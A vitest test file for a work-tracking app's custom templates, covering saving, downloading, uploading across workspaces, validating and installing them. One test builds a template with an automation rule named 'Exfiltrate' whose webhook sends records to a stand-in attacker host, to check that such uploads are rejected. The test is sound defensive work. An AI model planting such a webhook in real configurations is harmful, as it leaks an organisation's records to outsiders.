// Custom templates: save a configured project as a template, download it, upload it to
// another workspace, check and install definitions built by the setup wizard.
import { describe, expect, it, beforeAll } from "vitest";
import { getTemplate } from "../src/worker/templates/catalog.ts";
import { appSql, makeApp, createWorkspace, addUser, Client, type TestWorkspace } from "./helpers.ts";

const sql = appSql();
const { app } = makeApp(sql);
const UUID = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;

/** What the wizard sends for a small custom queue. */
function wizardDefinition(key = "FAC") {
  const statuses = [
    { key: "new", name: "New", category: "todo" },
    { key: "scheduled", name: "Scheduled", category: "in_progress" },
    { key: "fixed", name: "Fixed", category: "done" },
  ];
  return {
    format: "tend247-template",
    version: 1,
    name: "Facilities",
    summary: "Repairs around the plant.",
    project: { key, name: "Facilities", description: "Something broken in the building?" },
    team: "Maintenance",
    recordTypes: [
      {
        key: "repair",
        name: "Repair",
        fields: [
          { key: "location", label: "Location", type: "text", required: true },
          { key: "urgency", label: "Urgency", type: "select", options: { choices: [{ value: "today", label: "Today" }, { value: "this_week", label: "This week" }] } },
        ],
        workflow: {
          initial: "new",
          statuses,
          transitions: [
            { key: "schedule", name: "Schedule", from: ["new"], to: "scheduled", approval: { mode: "any", approvers: ["$approvers"] } },
            { key: "fix", name: "Mark fixed", from: ["new", "scheduled"], to: "fixed", requiredFields: ["location"] },
          ],
        },
      },
    ],
    sla: { policies: [{ name: "Standard", recordTypes: ["repair"], firstResponseMinutes: 120, resolutionMinutes: 2880, businessHours: true }] },
  };
}

describe("custom templates", () => {
  let ws: TestWorkspace;
  let admin: Client;
  let iteId: string;
  let savedId: string;
  let downloaded: Record<string, unknown>;

  beforeAll(async () => {
    ws = await createWorkspace(sql);
    admin = await new Client(app).signIn(ws.admin.email, ws.slug);
    const r = await admin.post("/api/admin/templates/it_enhancements/install", {});
    iteId = r.json.project.id;
    // Automation that names a person, and a webhook, cannot travel in a template.
    const agent = await addUser(sql, ws, "agent");
    const rule = await admin.post("/api/admin/automation", {
      name: "Route ERP changes",
      trigger: "record.created",
      projectId: iteId,
      conditions: [{ field: "custom.system", op: "eq", value: "erp" }],
      actions: [
        { type: "assign", userId: agent.id },
        { type: "set_field", field: "assigneeId", value: agent.id },
        { type: "notify", to: ["team"], message: "ERP change {{key}}" },
        { type: "webhook", url: "https://hooks.example.com/erp?token=abc" },
      ],
    });
    expect(rule.status, JSON.stringify(rule.json)).toBe(201);
  });

  it("saves a project as a template without people or secrets", async () => {
    const r = await admin.post(`/api/admin/projects/${iteId}/save-template`, { name: "Change requests", summary: "Our change process" });
    expect(r.status, JSON.stringify(r.json)).toBe(201);
    savedId = r.json.template.id;
    expect(r.json.template).toMatchObject({ name: "Change requests", summary: "Our change process", source: "saved" });
    expect(r.json.warnings).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/approvers are chosen when the template is installed/),
        expect.stringMatching(/assigning to a particular person was left out/),
        expect.stringMatching(/setting a field to a particular person was left out/),
        expect.stringMatching(/webhook action was left out/),
      ]),
    );
    const list = await admin.get("/api/admin/templates");
    expect(list.json.saved).toEqual([expect.objectContaining({ id: savedId, name: "Change requests", valid: true, projectKey: "ITE", approvals: true })]);

    const res = await admin.raw(`/api/admin/templates/saved/${savedId}/download`);
    expect(res.headers.get("content-disposition")).toBe('attachment; filename="change-requests.tend247-template.json"');
    const text = await res.text();
    downloaded = JSON.parse(text);
    expect(downloaded).toMatchObject({ format: "tend247-template", version: 1, name: "Change requests", team: "Product engineering" });
    expect(text).not.toMatch(UUID);
    expect(text).not.toContain("hooks.example.com");
    const rules = downloaded.automation as { actions: { type: string }[] }[];
    expect(rules[0]!.actions.map((a) => a.type)).toEqual(["notify"]);
  });

  it("refuses a duplicate name unless replacing", async () => {
    const dup = await admin.post(`/api/admin/projects/${iteId}/save-template`, { name: "Change requests" });
    expect(dup.status).toBe(409);
    const replaced = await admin.post(`/api/admin/projects/${iteId}/save-template`, { name: "Change requests", replace: true });
    expect(replaced.status).toBe(201);
    expect(replaced.json.template.id).toBe(savedId);
  });

  it("installs a saved template under a new key", async () => {
    const dup = await admin.post(`/api/admin/templates/${savedId}/install`, {});
    expect(dup.status).toBe(422);
    const r = await admin.post(`/api/admin/templates/${savedId}/install`, { projectKey: "ITE2", projectName: "Plant 2 changes" });
    expect(r.status, JSON.stringify(r.json)).toBe(201);
    const wf = await admin.get(`/api/admin/config/workflow/${r.json.recordTypeId}`);
    const original = getTemplate("it_enhancements")!.definition.recordTypes[0]!.workflow;
    expect(wf.json.published.definition.statuses.map((s: { key: string }) => s.key)).toEqual(original.statuses.map((s) => s.key));
    expect(wf.json.published.definition.transitions.find((t: { approval?: unknown }) => t.approval).approval.approvers).toEqual([ws.admin.id]);
    const rules = await admin.get("/api/admin/automation");
    expect(rules.json.rules.filter((x: { projectId: string }) => x.projectId === r.json.project.id).length).toBe(1);
  });

  it("uploads a downloaded file into another workspace", async () => {
    const other = await createWorkspace(sql, "Lakeside Bakery");
    const a = await new Client(app).signIn(other.admin.email, other.slug);
    const saved = await a.post("/api/admin/templates/saved", { definition: downloaded, name: "From Fernhollow", source: "file" });
    expect(saved.status, JSON.stringify(saved.json)).toBe(201);
    expect(saved.json.template.source).toBe("file");
    const installed = await a.post(`/api/admin/templates/${saved.json.template.id}/install`, {});
    expect(installed.status, JSON.stringify(installed.json)).toBe(201);
    const teams = await a.get("/api/admin/teams");
    expect(teams.json.teams.map((t: { name: string }) => t.name)).toEqual(["Product engineering"]);
    // The first workspace's templates are not visible here.
    expect((await a.get(`/api/admin/templates/saved/${savedId}`)).status).toBe(404);
  });

  it("explains what is wrong with a bad file", async () => {
    const notOurs = await admin.post("/api/admin/templates/saved", { definition: { hello: "world" }, name: "Bad" });
    expect(notOurs.status).toBe(422);
    expect(notOurs.json.error.message).toBe("This is not a valid Tend 24/7 template");

    const def = wizardDefinition();
    def.sla.policies[0]!.recordTypes = ["nope"];
    const badRef = await admin.post("/api/admin/templates/check", { definition: def });
    expect(badRef.status).toBe(422);
    expect(JSON.stringify(badRef.json)).toContain("sla.policies.0.recordTypes");

    // A file cannot smuggle in a webhook that would send records elsewhere.
    const hooked = { ...wizardDefinition(), automation: [{ name: "Exfiltrate", trigger: "record.created", actions: [{ type: "webhook", url: "https://evil.example/collect" }] }] };
    const noHooks = await admin.post("/api/admin/templates/saved", { definition: hooked, name: "Hooked" });
    expect(noHooks.status).toBe(422);
    expect(JSON.stringify(noHooks.json)).toContain("webhook");

    const def2 = wizardDefinition();
    def2.recordTypes[0]!.workflow.transitions[1]!.requiredFields = ["missing_field"];
    const badField = await admin.post("/api/admin/templates/check", { definition: def2 });
    expect(badField.status).toBe(422);
    expect(badField.json.error.details.issues[0].field).toMatch(/^recordTypes\.0\.workflow/);
  });

  it("checks a wizard definition without saving anything", async () => {
    const before = (await admin.get("/api/admin/projects")).json.projects.length;
    const teamsBefore = (await admin.get("/api/admin/teams")).json.teams.length;
    const ok = await admin.post("/api/admin/templates/check", { definition: wizardDefinition() });
    expect(ok.status, JSON.stringify(ok.json)).toBe(200);
    expect(ok.json.summary).toMatchObject({ name: "Facilities", fields: ["Location", "Urgency"], statuses: ["New", "Scheduled", "Fixed"], approvals: true, sla: true });
    const taken = await admin.post("/api/admin/templates/check", { definition: wizardDefinition("ITE") });
    expect(taken.status).toBe(422);
    expect(taken.json.error.details.issues[0].field).toBe("projectKey");
    expect((await admin.get("/api/admin/projects")).json.projects.length).toBe(before);
    expect((await admin.get("/api/admin/teams")).json.teams.length).toBe(teamsBefore);
  });

  it("installs a wizard definition, and saves it for next time", async () => {
    const r = await admin.post("/api/admin/templates/install", { definition: wizardDefinition() });
    expect(r.status, JSON.stringify(r.json)).toBe(201);
    expect(r.json.project.key).toBe("FAC");
    const rec = await admin.post("/api/records", { recordTypeId: r.json.recordTypeId, title: "Dock door stuck", custom: { location: "Dock 3" } });
    expect(rec.status, JSON.stringify(rec.json)).toBe(201);
    const detail = await admin.get(`/api/records/${rec.json.record.key}`);
    expect(detail.json.sla.map((c: { policyName: string }) => c.policyName)).toContain("Standard");

    const saved = await admin.post("/api/admin/templates/saved", { definition: wizardDefinition(), name: "Facilities", source: "wizard" });
    expect(saved.status, JSON.stringify(saved.json)).toBe(201);
    expect(saved.json.template.source).toBe("wizard");
  });

  it("saves a project whose help texts are long, and deletes broken templates", async () => {
    const p = await admin.post("/api/admin/projects", { key: "LONG", name: "Long help" });
    const rt = await admin.post(`/api/admin/projects/${p.json.project.id}/record-types`, { key: "thing", name: "Thing" });
    expect((await admin.post(`/api/admin/record-types/${rt.json.recordType.id}/fields`, { key: "notes", label: "Notes", type: "text", helpText: "x".repeat(900) })).status).toBe(201);
    const r = await admin.post(`/api/admin/projects/${p.json.project.id}/save-template`, { name: "Long help" });
    expect(r.status, JSON.stringify(r.json)).toBe(201);
    // A template that stops validating (say, after an upgrade) can still be removed.
    await sql.begin(async (tx) => {
      await tx`select set_config('app.tenant_id', ${ws.id}, true)`;
      await tx`update workspace_templates set definition = '{"format":"nope"}'::jsonb where id = ${r.json.template.id}`;
    });
    const listed = (await admin.get("/api/admin/templates")).json.saved.find((t: { id: string }) => t.id === r.json.template.id);
    expect(listed.valid).toBe(false);
    expect((await admin.delete(`/api/admin/templates/saved/${r.json.template.id}`)).status).toBe(200);
  });

  it("is admin-only, and deletes", async () => {
    const agent = await addUser(sql, ws, "agent");
    const c = await new Client(app).signIn(agent.email, ws.slug);
    expect((await c.post(`/api/admin/projects/${iteId}/save-template`, { name: "x" })).status).toBe(403);
    expect((await c.get("/api/admin/templates")).status).toBe(403);
    expect((await c.raw(`/api/admin/templates/saved/${savedId}/download`)).status).toBe(403);
    expect((await admin.delete(`/api/admin/templates/saved/${savedId}`)).status).toBe(200);
    expect((await admin.get(`/api/admin/templates/saved/${savedId}`)).status).toBe(404);
  });
});
